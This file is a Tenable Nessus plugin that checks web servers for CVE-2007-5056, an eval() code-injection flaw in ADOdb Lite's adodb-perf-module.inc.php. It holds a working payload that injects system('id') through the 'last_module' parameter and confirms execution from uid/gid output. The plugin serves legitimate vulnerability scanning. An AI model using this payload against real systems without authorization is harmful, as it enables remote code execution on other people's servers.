#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(26072);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2007-5056");
  script_bugtraq_id(25768, 25997);
  script_xref(name:"OSVDB", value:"40596");

  script_name(english:"ADOdb Lite adodb-perf-module.inc.php last_module Variable Arbitrary Code Execution");
  script_summary(english:"Tries to run a command via ADOdb Lite's adodb-perf-module.inc.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"ADOdb Lite, a lightweight database framework for PHP applications, is
installed on the remote host. 

The version of ADOdb Lite on the remote host fails to sanitize input
to the 'last_module' parameter of the 'adodb-perf-module.inc.php'
script before using it in an 'eval()' statement to evaluate PHP code. 
An unauthenticated attacker can leverage this issue to execute
arbitrary code on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/4442" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/481984/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://blog.cmsmadesimple.org/2007/10/07/announcing-cms-made-simple-1141/" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "pafiledb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);

# Generate a list of extra paths to check.
extra_dirs = make_array();
ndirs = 0;
# - CMS Made Simple
foreach dir (cgi_dirs())
{
  extra_dirs[ndirs++] = string(dir, "/lib/adodb_lite");
}
if (thorough_tests)
{
  foreach dir (make_list("/cms"))
    extra_dirs[ndirs++] = string(dir, "/lib/adodb_lite");
}
# - paFileDB.
install = get_kb_item(string("www/", port, "/pafiledb"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    extra_dirs[ndirs++] = string(dir, "/includes/adodb");
  }
}


# Try to exploit the issue to run a command.
cmd = "id";
exploit = string(
  "zZz_ADOConnection{}system(", cmd, ");class zZz_ADOConnection{}//"
);

http_check_remote_code(
  extra_dirs    : extra_dirs,
  check_request : string("/adodb-perf-module.inc.php?last_module=", urlencode(str:exploit)),
  check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
  command       : cmd,
  port          : port,
  warning       : TRUE
);
